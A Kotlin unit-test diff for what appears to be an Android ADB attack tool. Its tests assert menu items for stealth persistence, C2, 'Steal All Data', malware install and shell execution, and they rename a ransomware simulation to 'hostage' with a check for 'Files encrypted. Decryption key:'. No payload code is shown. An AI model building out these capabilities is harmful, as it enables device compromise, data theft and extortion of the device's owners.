@@ -3,6 +3,9 @@ import org.junit.jupiter.api.Test
 import org.junit.jupiter.api.BeforeEach
 import java.io.ByteArrayOutputStream
 import java.io.PrintStream
+import javax.crypto.SecretKey
+import javax.crypto.spec.SecretKeySpec
+import java.util.Base64
 
 class MainTest {
 
@@ -36,7 +39,7 @@ class MainTest {
         assertTrue(output.contains("1. Prepare Attack (Enable stealth, persistent access, start C2)"))
         assertTrue(output.contains("2. Steal All Data (to /sdcard/stolen_data)"))
         assertTrue(output.contains("3. Dump System Info (to /sdcard/system_info)"))
-        assertTrue(output.contains("4. Simulate Ransomware"))
+        assertTrue(output.contains("4. Simulate Hostage"))
         assertTrue(output.contains("5. Install Malware"))
         assertTrue(output.contains("6. Execute Shell Command"))
         assertTrue(output.contains("7. List Files"))
@@ -89,11 +92,11 @@ class MainTest {
     }
 
     @Test
-    fun testSimulateRansomware() {
+    fun testHostage() {
         val adb = ADBBase()
-        adb.simulateRansomware()
+        adb.hostage()
         val output = outputStreamCaptor.toString().trim()
-        assertTrue(output.contains("Simulating ransomware"))
+        assertTrue(output.contains("Files encrypted. Decryption key:"))
     }
 
     @Test
@@ -268,5 +271,41 @@ class MainTest {
         adb.uploadDataStealthily(data, uploadUrl)
         val output = outputStreamCaptor.toString().trim()
         assertTrue(output.contains("Simulating data upload"))
+    }
+
+    @Test
+    fun testDecryptFile() {
+        val adb = ADBBase()
+        val filePath = "/sdcard/encrypted_file.txt"
+        val keyString = "your_base64_encoded_key_here"
+        val keyBytes = Base64.getDecoder().decode(keyString)
+        val key: SecretKey = SecretKeySpec(keyBytes, 0, keyBytes.size, "AES")
+        adb.decryptFile(filePath, key)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("File decrypted successfully"))
+    }
+
+    @Test
+    fun testDetectUnauthorizedAttempts() {
+        val adb = ADBBase()
+        val unauthorized = adb.detectUnauthorizedAttempts()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Unauthorized attempt detected: $unauthorized"))
+    }
+
+    @Test
+    fun testLogSimulationAttempt() {
+        val adb = ADBBase()
+        adb.logSimulationAttempt()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Hostage simulation attempt logged."))
+    }
+
+    @Test
+    fun testDisableSimulation() {
+        val adb = ADBBase()
+        adb.disableSimulation()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Hostage simulation disabled due to unauthorized attempts."))
     }
 }
